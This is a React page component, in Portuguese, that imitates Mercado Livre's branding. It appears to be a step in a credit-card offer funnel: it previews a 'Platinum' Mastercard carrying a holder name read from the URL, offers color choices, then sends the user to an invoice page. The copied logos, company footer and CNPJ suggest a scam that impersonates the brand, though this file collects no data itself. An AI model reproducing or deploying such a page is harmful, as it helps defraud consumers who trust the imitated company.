import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import mlLogo from "@/assets/mercado-livre-logo.png";
import { FunnelSteps } from "@/components/FunnelSteps";
import mlHandshake from "@/assets/ml-handshake.png";
import mastercard from "@/assets/mastercard.png";
import cardChip from "@/assets/card-chip.png";

export const Route = createFileRoute("/personalizar")({
  head: () => ({
    meta: [
      { title: "Personalize seu cartão - Mercado Livre" },
      { name: "description", content: "Escolha a cor do seu novo cartão." },
    ],
  }),
  component: Personalizar,
});

const colors = [
  { name: "Azul", value: "#3483FA", gradient: "from-[#F4D147] to-[#2968C8]" },
  { name: "Amarelo", value: "#F4D147", gradient: "from-[#F4D147] to-[#E6CC00]" },
  { name: "Vermelho", value: "#E53935", gradient: "from-[#E53935] to-[#B71C1C]" },
  { name: "Cinza", value: "#9E9E9E", gradient: "from-[#9E9E9E] to-[#616161]" },
  { name: "Preto", value: "#1A1A1A", gradient: "from-[#2D2D2D] to-[#0A0A0A]" },
];

function Personalizar() {
  const navigate = useNavigate();
  const [selected, setSelected] = useState(0);
  const card = colors[selected];
  const isLight = card.value === "#F4D147";
  const textColor = isLight ? "text-gray-800" : "text-white";
  const subTextColor = isLight ? "text-gray-700/70" : "text-white/70";
  const platinumColor = isLight ? "text-gray-700" : "text-white/80";

  // Get name from URL query string
  const nome =
    typeof window !== "undefined"
      ? new URLSearchParams(window.location.search).get("nome")?.toUpperCase() || "NOME DO TITULAR"
      : "NOME DO TITULAR";

  return (
    <div className="min-h-screen bg-white flex flex-col relative overflow-hidden">
      <div className="bg-[#F4D147] w-full py-3 flex justify-center items-center shadow-sm">
        <img src={mlLogo} alt="Mercado Livre" className="h-9 object-contain" />
      </div>
      <FunnelSteps current={3} />

      <main className="flex-1 flex items-start justify-center px-4 py-8 relative z-10">
        <div className="w-full max-w-md bg-white rounded-xl shadow-md p-6 md:p-8">
          <h1 className="text-2xl font-bold text-gray-800 text-center mb-6">
            Personalize o seu cartão
          </h1>

          {/* Credit card preview - 3D rotating */}
          <div className="card-3d-scene mb-6 flex justify-center">
            <div className="card-3d-rotator relative w-[62%] max-w-[260px] aspect-[1/1.586]">
              {/* FRONT */}
              <div
                className="card-3d-face absolute inset-0 rounded-2xl shadow-2xl overflow-hidden"
                style={{
                  backgroundColor: card.value,
                  backgroundImage:
                    "linear-gradient(90deg, rgba(0,0,0,.32) 0 18%, rgba(0,0,0,.08) 18%, transparent 42%), radial-gradient(circle at 72% 18%, rgba(255,255,255,.14), transparent 34%), linear-gradient(145deg, rgba(255,255,255,.10), rgba(0,0,0,.20))",
                }}
              >
                <img
                  src={mlHandshake}
                  alt="Mercado Livre"
                  className="absolute top-5 left-8 w-14 h-auto"
                />
                <span
                  className={`absolute top-8 right-6 text-[10px] font-semibold tracking-[0.16em] ${platinumColor}`}
                >
                  PLATINUM
                </span>
                <img
                  src={cardChip}
                  alt="Chip"
                  className="absolute top-[31%] left-8 w-11 h-auto"
                />
                <svg
                  className={`absolute top-[30%] right-8 w-11 h-11 ${subTextColor}`}
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="1.9"
                  strokeLinecap="round"
                >
                  <path d="M6.5 8.5a5 5 0 0 1 0 7" />
                  <path d="M10 6a8.5 8.5 0 0 1 0 12" />
                  <path d="M13.5 3.8a12 12 0 0 1 0 16.4" />
                </svg>
                <div
                  className={`absolute left-8 bottom-[25%] max-w-[66%] truncate text-sm font-medium tracking-[0.12em] ${textColor}`}
                >
                  {nome}
                </div>
                <img
                  src={mastercard}
                  alt="Mastercard"
                  className="absolute bottom-6 right-6 w-14 h-auto"
                />
              </div>

              {/* BACK */}
              <div
                className="card-3d-face card-3d-back absolute inset-0 rounded-2xl shadow-2xl overflow-hidden"
                style={{
                  backgroundColor: card.value,
                  backgroundImage:
                    "linear-gradient(90deg, rgba(0,0,0,.34) 0 18%, rgba(0,0,0,.10) 18%, transparent 44%), linear-gradient(145deg, rgba(255,255,255,.08), rgba(0,0,0,.24))",
                }}
              >
                <div className={`absolute top-7 right-7 text-right ${textColor}`}>
                  <div className="text-[9px] font-semibold tracking-[0.16em] opacity-90">PLATINUM</div>
                  <div className="mt-1 text-[14px] font-bold leading-[.9]">mercado</div>
                  <div className="text-[14px] font-bold leading-[.9]">livre</div>
                </div>
                <div className={`absolute left-8 top-[31%] max-w-[42%] truncate text-[9px] font-medium tracking-[0.12em] ${textColor}`}>
                  {nome}
                </div>
                <div className={`absolute right-6 top-[38%] text-right font-mono text-base leading-[1.42] tracking-[0.08em] ${textColor}`}>
                  <div>1234</div>
                  <div className="border-y border-current/70 py-0.5">5678</div>
                  <div>9101</div>
                  <div>1213</div>
                </div>
                <div className={`absolute right-6 top-[67%] flex items-end gap-2 text-right font-mono ${textColor}`}>
                  <span className="text-[5px] leading-[.9] opacity-85">EXP.<br />DATE</span>
                  <span className="text-[9px] tracking-[0.08em]">05/31</span>
                </div>
                <div className={`absolute right-6 top-[74%] flex items-end gap-2 text-right font-mono ${textColor}`}>
                  <span className="text-[5px] leading-[.9] opacity-85">SECURITY<br />CODE</span>
                  <span className="text-[9px] tracking-[0.08em]">145</span>
                </div>
                <div className="absolute right-6 bottom-[18%] rounded-sm bg-red-600 px-1 py-0.5 text-[5px] font-bold text-white">
                  Banco24Horas
                </div>
                <img
                  src={mastercard}
                  alt="Mastercard"
                  className="absolute bottom-6 right-6 w-14 h-auto"
                />
              </div>
            </div>
          </div>

          {/* Color picker */}
          <div className="flex justify-center gap-4 mb-6">
            {colors.map((c, i) => (
              <button
                key={c.name}
                onClick={() => setSelected(i)}
                aria-label={`Cor ${c.name}`}
                className={`w-10 h-10 rounded-full flex items-center justify-center shadow-md transition-all ${
                  selected === i
                    ? "ring-2 ring-offset-2 ring-[#F4D147] scale-110"
                    : "hover:scale-105"
                }`}
                style={{ backgroundColor: c.value }}
              >
                {selected === i && (
                  <svg
                    viewBox="0 0 24 24"
                    className={`w-5 h-5 ${c.value === "#F4D147" ? "text-gray-800" : "text-white"}`}
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="3"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <polyline points="20 6 9 17 4 12" />
                  </svg>
                )}
              </button>
            ))}
          </div>

          <button
            onClick={() => navigate({ to: "/fatura" })}
            className="w-full bg-[#F4D147] hover:bg-[#E5C238] text-gray-900 text-lg font-semibold py-4 rounded-md shadow-md transition-all"
          >
            Continuar
          </button>
        </div>
      </main>

      <footer className="text-center text-xs text-gray-500 py-6 relative z-10">
        <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
        <p className="mt-1">
          CNPJ: 10.573.521/0001-91 ·{" "}
          <a href="#" className="text-gray-900">
            Termos e condições
          </a>{" "}
          ·{" "}
          <a href="#" className="text-gray-900">
            Privacidade
          </a>
        </p>
      </footer>
    </div>
  );
}
